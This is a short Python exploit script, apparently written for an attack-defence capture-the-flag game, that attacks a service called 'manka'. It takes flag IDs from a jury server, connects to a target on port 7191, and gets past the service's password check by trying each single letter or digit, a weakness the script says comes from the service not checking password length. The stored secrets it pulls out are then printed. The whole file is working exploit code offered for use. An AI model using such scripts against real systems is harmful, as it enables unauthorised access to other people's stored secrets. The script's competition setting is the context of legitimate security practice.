#!/usr/bin/env python3

from pwn import *
import string
import sys
import requests

context.log_level = 'warn'

secret_size = 40
address = sys.argv[1]
port = 7191
TASKNAME = 'manka'
ALPH = string.digits + string.ascii_letters
JURY_IP = "10.10.10.10"


def password_length_vuln(checker_key):
    """Service doesn't check length of passwords so we can bruteforce first char."""
    for sym in ALPH:
        try:
            flag = get_flag(checker_key, sym.encode())
            return flag
        except Exception:
            pass


def get_flag(key, password):
    conn = remote(address, port)
    conn.recvuntil(b': ')
    conn.sendline(b'2')
    conn.recvuntil(b': ')
    conn.sendline(key)
    conn.recvuntil(b': ')
    conn.sendline(password)
    conn.recvuntil(b': ')
    stored_secret = conn.recv(secret_size + 1).replace(b'\0', b'').replace(b'\n', b'')
    conn.close()
    return stored_secret

def get_attack_data():
    return requests.get(f'http://{JURY_IP}/api/client/attack_data').json()[TASKNAME][address]


at_d = get_attack_data()
for hint in at_d:
    print(password_length_vuln(hint.encode()),flush=True)
